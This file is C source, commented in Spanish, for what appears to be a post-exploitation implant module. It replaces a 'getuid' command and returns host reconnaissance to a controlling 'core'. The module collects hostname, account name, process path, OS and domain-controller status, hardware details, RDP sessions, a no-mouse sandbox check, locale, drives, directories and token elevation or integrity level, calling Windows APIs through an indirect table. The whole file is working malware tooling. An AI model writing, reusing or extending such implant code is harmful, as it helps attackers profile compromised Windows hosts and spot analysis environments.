/**
Sustituye getuid, ahora recolecta informacion basica y superficial del sistema

112 - 0x70

1. Hostname (GetComputerNameW)
2. Usuario completo (GetUserNameExW NameSamCompatible)
3. PID + process path (GetCurrentProcessId + GetModuleFileNameW)
4. OS version + build (RtlGetVersion) + product type (workstation/server) y Uptime (GetTickCount64)
5. RAM total/usable (GlobalMemoryStatusEx) + CPUs (GetSystemInfo) y Pantalla/resolucion (GetSystemMetrics)
6. Zona horaria (GetTimeZoneInformation) + Locale (GetUserDefaultLCID / GetUserDefaultUILanguage)
7. Drives (GetLogicalDrives)
8. Windows dir + System dir + Temp
9. Elevacion (IsUserAnAdmin - shlwapi, o token elevation)

Avanzado:
GPUs requiere api DOM o registry heuristica
 */
#define WINVER 0x0601
#define _WIN32_WINNT 0x0601
#include <stdint.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include "api_table.h"
#include "parser.h"
#include "module_helpers.h"

void go(ApiTable* api, const char* task_uuid, Param* params, uint32_t param_count) {
    /* Buffer de salida */
    char* out = (char*)api->malloc(OUT_BUF_SIZE);
    if (!out) return;
    size_t used = 0;

    /* Hostname y Usuario */
    wchar_t hostname_wide[260];
    DWORD hostname_size = 260;
    char hostname_utf8[520];

    char err_str[12];

    if (!api->GetComputerNameW(hostname_wide, &hostname_size)) {
        buf_append_str(out, &used, "info: error al leer HOSTNAME (error ");
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
    }else {
        buf_append_str(out, &used, "[Hostname]:\t");
        api->WideCharToMultiByte(CP_UTF8, 0, hostname_wide, -1,
                                 hostname_utf8, sizeof(hostname_utf8), NULL, NULL);
        buf_append_str(out, &used, hostname_utf8);
        buf_append_str(out, &used, "\n");
    }

    wchar_t username_wide[260];
    u_long username_size = 260;
    char username_utf8[520];

    if (!api->GetUserNameExW(2, username_wide, &username_size)) { //NameSamCompatible
        buf_append_str(out, &used, "info: error al leer USERNAME (error ");
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
    }else {
        buf_append_str(out, &used, "[Username]:\t");
        api->WideCharToMultiByte(CP_UTF8, 0, username_wide, -1,
                                 username_utf8, sizeof(username_utf8), NULL, NULL);
        buf_append_str(out, &used, username_utf8);
        buf_append_str(out, &used, "\n");
    }

    /* PID y Process path */
    wchar_t filepath_wide[260];
    char filepath_utf8[520];

    DWORD pid = api->GetCurrentProcessId();
    char pid_str[12];

    buf_append_str(out, &used, "[PID]:\t");
    u64_to_dec(pid, pid_str);
    buf_append_str(out, &used, pid_str);
    buf_append_str(out, &used, "\n");


    if (!api->GetModuleFileNameW(NULL, filepath_wide, 260)) {
        buf_append_str(out, &used, "info: error al leer FILE PATH (error ");
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
    }else {
        buf_append_str(out, &used, "[FILE PATH]:\t");
        api->WideCharToMultiByte(CP_UTF8, 0, filepath_wide, -1,
                                 filepath_utf8, sizeof(filepath_utf8), NULL, NULL);
        buf_append_str(out, &used, filepath_utf8);
        buf_append_str(out, &used, "\n");
    }

    /* OS version + Build + Product type y Uptime */
    RTL_OSVERSIONINFOEXW osInfo;
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);
    if (api->RtlGetVersion((PRTL_OSVERSIONINFOW)&osInfo)) {
        buf_append_str(out, &used, "info: error al leer OS VERSION (error)\n");
    }else {
        char os_utf8[64];

        if (osInfo.wProductType == VER_NT_WORKSTATION) {// Windows Workstation
            buf_append_str(out, &used, "[WORKSTATION][OS]:\t");
            if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 1) {// Win 7 M:6 m:1
                api->sprintf(os_utf8,"Windows 7 (build %lu)", osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);

            } else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 2) {// Win 8 M:6 m:2
                api->sprintf(os_utf8, "Windows 8 (build %lu)", osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);

            } else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 3) {
                api->sprintf(os_utf8, "Windows 8.1 (build %lu)", osInfo.dwBuildNumber);// Win 8.1 M:6 m:3
                buf_append_str(out, &used, os_utf8);

            } else if (osInfo.dwMajorVersion == 10 && osInfo.dwBuildNumber >= 22000) {// Win 10 M:10 m:0 b>=22000
                api->sprintf(os_utf8, "Windows 11 (build %lu)", osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);

            } else if (osInfo.dwMajorVersion == 10) {
                api->sprintf(os_utf8,"Windows 10 (build %lu)",osInfo.dwBuildNumber);// Win 10 M:10 m:0 b:10240–19045
                buf_append_str(out, &used, os_utf8);

            } else {
                api->sprintf(os_utf8,"[!] [Unknown Version] Windows %lu.%lu (build %lu)",
                    osInfo.dwMajorVersion,
                    osInfo.dwMinorVersion,
                    osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);
            }

        } else if (osInfo.wProductType == VER_NT_SERVER || osInfo.wProductType == VER_NT_DOMAIN_CONTROLLER) {
            // Windows Server
            if (osInfo.wProductType == VER_NT_DOMAIN_CONTROLLER) {
                buf_append_str(out, &used, "[DC][SERVER][OS]:\t");
            }else buf_append_str(out, &used, "[SERVER][OS]:\t");


            if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 2) {// WinServ 2012 M:6 m:2
                api->sprintf(os_utf8,"Windows Server 2012 (build %lu)", osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);

            } else if (osInfo.dwMajorVersion == 6 && osInfo.dwMinorVersion == 3) {// WinServ 2012 R2 M:6 m:3
                api->sprintf(os_utf8,"Windows Server 2012 R2 (build %lu)",osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);

            } else if (osInfo.dwMajorVersion == 10 && osInfo.dwBuildNumber == 14393) {// WinServ 2016 M:10 m:0 b:14393
                api->sprintf(os_utf8,"Windows Server 2016 (build %lu)",osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);

            } else if (osInfo.dwMajorVersion == 10 && osInfo.dwBuildNumber == 17763) {// WinServ 2019 M:10 m:0 b:17763
                api->sprintf(os_utf8,"Windows Server 2019 (build %lu)",osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);

            } else if (osInfo.dwMajorVersion == 10 && osInfo.dwBuildNumber == 20348) {// WinServ 2022 M:10 m:0 b:20348
                api->sprintf(os_utf8,"Windows Server 2022 (build %lu)",osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);

            } else if (osInfo.dwMajorVersion == 10 && osInfo.dwBuildNumber == 26100) {// WinServ 2025 M:10 m:0 b:26100
                api->sprintf(os_utf8,"Windows Server 2025 (build %lu)",osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);

            } else {
                api->sprintf(os_utf8,
                    "[!] [Unknown Version] Windows Server %lu.%lu (build %lu)",
                    osInfo.dwMajorVersion,
                    osInfo.dwMinorVersion,
                    osInfo.dwBuildNumber);
                buf_append_str(out, &used, os_utf8);
            }
        }else {
            buf_append_str(out, &used, "[OS VERSION]: \t Unknown OS\n");
        }
    }

    /* Uptime */
    ULONGLONG ms = api->GetTickCount64();
    ULONGLONG seconds = ms / 1000;
    ULONGLONG days = seconds / 86400;seconds %= 86400;
    ULONGLONG hours = seconds / 3600;seconds %= 3600;
    ULONGLONG minutes = seconds / 60;seconds %= 60;
    char uptime[64];
    api->sprintf(uptime,"[UPTIME]: %llud %lluh %llum %llus\n",
        days,
        hours,
        minutes,
        seconds
    );
    buf_append_str(out, &used, uptime);

    /* RAM + CPU + Screen */
    char ram[520];
    MEMORYSTATUSEX mem_status;
    mem_status.dwLength = sizeof (mem_status);
    if (!api->GlobalMemoryStatusEx(&mem_status)) {
        buf_append_str(out, &used, "info: error al leer RAM (error ");
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
    }else {
        api->sprintf(ram,"[RAM]:\tTotal: %lluMB\tAvailable: %lluMB\tUsed: %lu%%\n",
        mem_status.ullTotalPhys / (1024ULL * 1024ULL),
        mem_status.ullAvailPhys / (1024ULL * 1024ULL),
        mem_status.dwMemoryLoad);
        buf_append_str(out, &used, ram);
    }

    char cpu[520];
    SYSTEM_INFO system_info;
    api->GetSystemInfo(&system_info);
    if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {
        buf_append_str(out, &used, "[ARCH]: x64\t");
    }else if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        buf_append_str(out, &used, "[ARCH]: ARM64\t");
    }else if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        buf_append_str(out, &used, "[ARCH]: x86\t");
    }else if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM) {
        buf_append_str(out, &used, "[ARCH]: ARM86\t");
    }
    api->sprintf(cpu,"[CPU]: %lu proc Page size: %lu\n",
    system_info.dwNumberOfProcessors,
    system_info.dwPageSize);
    buf_append_str(out, &used, cpu);

    char screen[520];
    int width  = api->GetSystemMetrics(SM_CXSCREEN); // ancho pantalla principal
    int height = api->GetSystemMetrics(SM_CYSCREEN); // alto pantalla principal
    if (width == 0 || height == 0) {
        buf_append_str(out, &used, "info: error al leer DISPLAY RESOLUTION (error ");
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
    }else {
        api->sprintf(screen,"[DISPLAY]:\t%dx%d (principal)\t",width,height);
        buf_append_str(out, &used, screen);
    }

    int monitors = api->GetSystemMetrics(SM_CMONITORS); // cantidad pantallas
    api->sprintf(screen,"%d monitor/s\n",monitors);
    buf_append_str(out, &used, screen);

    int rds = api->GetSystemMetrics(SM_REMOTESESSION); // si es RDS
    if (rds > 0) {
        buf_append_str(out, &used, "\t[!] RDS detected");
    }

    int rdp = api->GetSystemMetrics(SM_REMOTECONTROL); // si es RDP
    if (rdp > 0) {
        buf_append_str(out, &used, "\t[!] RDP detected");
    }

    int mouse = api->GetSystemMetrics(SM_MOUSEPRESENT); // raton presente
    if (mouse == 0) {
        buf_append_str(out, &used, "\t[!] No mouse");
    }
    buf_append_str(out, &used, "\t");

    /* Time Zone + Locale conf */
    TIME_ZONE_INFORMATION timezone;
    char time[520];

    DWORD tz = api->GetTimeZoneInformation(&timezone);
    if (tz == TIME_ZONE_ID_INVALID) {
        buf_append_str(out, &used, "[TIME]: error leyendo timezone\n");
    }else{
        LONG standard_offset = -(timezone.Bias + timezone.StandardBias);
        LONG daylight_offset  = -(timezone.Bias + timezone.DaylightBias);
        api->sprintf(
            time,"[TIMEZONE]: %ls UTC%+03ld:%02ld DST UTC%+03ld:%02ld\n",
            timezone.StandardName,
            standard_offset / 60,
            api->labs(standard_offset % 60),
            daylight_offset / 60,
            api->labs(daylight_offset % 60)
        );
        buf_append_str(out, &used, time);
    }

    LCID locale_id = api->GetUserDefaultLCID();
    WCHAR locale_wide[LOCALE_NAME_MAX_LENGTH];
    char locale_utf8[LOCALE_NAME_MAX_LENGTH];
    if (!api->LCIDToLocaleName(locale_id, locale_wide, LOCALE_NAME_MAX_LENGTH,LOCALE_ALLOW_NEUTRAL_NAMES)) {
        buf_append_str(out, &used, "info: error al leer LOCALE (error ");
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
    }else {
        api->WideCharToMultiByte(CP_UTF8, 0, locale_wide, -1,
                             locale_utf8, sizeof(locale_utf8), NULL, NULL);
        buf_append_str(out, &used, "[Locale]:\t");
        buf_append_str(out, &used, locale_utf8);
        buf_append_str(out, &used, "\n");
    }

    LANGID ui_lang = api->GetUserDefaultUILanguage();
    WCHAR lang_wide[LOCALE_NAME_MAX_LENGTH];
    char lang_utf8[LOCALE_NAME_MAX_LENGTH];

    LCID ui_lcid = MAKELCID(ui_lang, SORT_DEFAULT);// macro inline

    if (!api->LCIDToLocaleName(ui_lcid, lang_wide, LOCALE_NAME_MAX_LENGTH, LOCALE_ALLOW_NEUTRAL_NAMES)) {
        buf_append_str(out, &used, "info: error al leer UI LANGUAGE (error ");
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
    } else {
        api->WideCharToMultiByte(CP_UTF8, 0, lang_wide, -1,
                                 lang_utf8, sizeof(lang_utf8), NULL, NULL);
        buf_append_str(out, &used, "[UI Language]:\t");
        buf_append_str(out, &used, lang_utf8);
        buf_append_str(out, &used, "\n");
    }

    /* Drives */
    DWORD drive_mask = api->GetLogicalDrives();
    buf_append_str(out, &used, "[Drives]:\n");

    for (int i = 0; i < 26; i++) {
        if (!(drive_mask & (1u << i))) continue;

        wchar_t root[4];
        root[0] = (wchar_t)(L'A' + i);
        root[1] = L':';
        root[2] = L'\\';
        root[3] = L'\0';

        UINT type = api->GetDriveTypeW(root);
        const char* type_str;
        switch (type) {
            case DRIVE_REMOVABLE: type_str = "removable"; break;
            case DRIVE_FIXED:     type_str = "fixed";     break;
            case DRIVE_REMOTE:    type_str = "remote";    break;
            case DRIVE_CDROM:     type_str = "cdrom";     break;
            case DRIVE_RAMDISK:   type_str = "ramdisk";   break;
            default:              type_str = "unknown";   break;
        }

        char drive_line[96];
        api->sprintf(drive_line, "%c:\\  [%s]\t", (char)(L'A' + i), type_str);
        buf_append_str(out, &used, drive_line);

        ULARGE_INTEGER total, free;
        if (api->GetDiskFreeSpaceExW(root, NULL, &total, &free)) {
            unsigned long long total_gb = (unsigned long long)total.QuadPart >> 30;
            unsigned long long free_gb  = (unsigned long long)free.QuadPart  >> 30;
            api->sprintf(drive_line, "total %llu GB, free %llu GB\n", total_gb, free_gb);
        } else {
            api->sprintf(drive_line, "size n/a\n");   /* CD sin medio, red desconectada */
        }
        buf_append_str(out, &used, drive_line);
    }

    /* Windows dir + System dir + Temp */

    wchar_t path_wide[260];
    char path_utf8[520];

    buf_append_str(out, &used, "[Windows dir]:\t");
    if (api->GetWindowsDirectoryW(path_wide, 260)) {
        api->WideCharToMultiByte(CP_UTF8, 0, path_wide, -1,
                                 path_utf8, sizeof(path_utf8), NULL, NULL);
        buf_append_str(out, &used, path_utf8);
    } else {
        buf_append_str(out, &used, "error");
    }
    buf_append_str(out, &used, "\n");

    buf_append_str(out, &used, "[System dir]:\t");
    if (api->GetSystemDirectoryW(path_wide, 260)) {
        api->WideCharToMultiByte(CP_UTF8, 0, path_wide, -1,
                                 path_utf8, sizeof(path_utf8), NULL, NULL);
        buf_append_str(out, &used, path_utf8);
    } else {
        buf_append_str(out, &used, "error");
    }
    buf_append_str(out, &used, "\n");

    buf_append_str(out, &used, "[Temp]:\t");
    if (api->GetTempPathW(260, path_wide)) {
        api->WideCharToMultiByte(CP_UTF8, 0, path_wide, -1,
                                 path_utf8, sizeof(path_utf8), NULL, NULL);
        buf_append_str(out, &used, path_utf8);
    } else {
        buf_append_str(out, &used, "error");
    }
    buf_append_str(out, &used, "\n");

    /* Elevacion + integridad */
    HANDLE hToken = NULL;
    if (!api->OpenProcessToken(api->GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        buf_append_str(out, &used, "[Elevation]:\tunknown (no token)\n");
    } else {
        TOKEN_ELEVATION te;
        DWORD len = 0;
        BOOL elevated = FALSE;
        if (api->GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &len))
            elevated = te.TokenIsElevated;

        /* Nivel de integridad (RID en el SID del mandatory label) */
        BYTE int_buf[64];
        DWORD int_len = 0;
        DWORD rid = 0;
        const char* int_str = "unknown";
        if (api->GetTokenInformation(hToken, TokenIntegrityLevel, int_buf, sizeof(int_buf), &int_len)) {
            PTOKEN_MANDATORY_LABEL label = (PTOKEN_MANDATORY_LABEL)int_buf;
            /* El SID de integridad SIEMPRE tiene 1 subauthority → RID en offset 8
               (1 revision + 1 count + 6 authority). Sin GetSidSubAuthority extra. */
            api->memcpy(&rid, (BYTE*)label->Label.Sid + 8, 4);
            switch (rid) {
                case SECURITY_MANDATORY_LOW_RID:    int_str = "Low";    break;
                case SECURITY_MANDATORY_MEDIUM_RID: int_str = "Medium"; break;
                case SECURITY_MANDATORY_HIGH_RID:   int_str = "High";   break;
                case SECURITY_MANDATORY_SYSTEM_RID: int_str = "System"; break;
                default:                            int_str = "other";  break;
            }
        }
        api->CloseHandle(hToken);

        buf_append_str(out, &used, "[Elevation]:\t");
        buf_append_str(out, &used, elevated ? "yes" : "no");
        buf_append_str(out, &used, " (integrity: ");
        buf_append_str(out, &used, int_str);
        buf_append_str(out, &used, ")\n");
    }

    /* Reportar al core */
    api->report_result(task_uuid, (const uint8_t*)out, used, 0x95);
    api->free(out);
}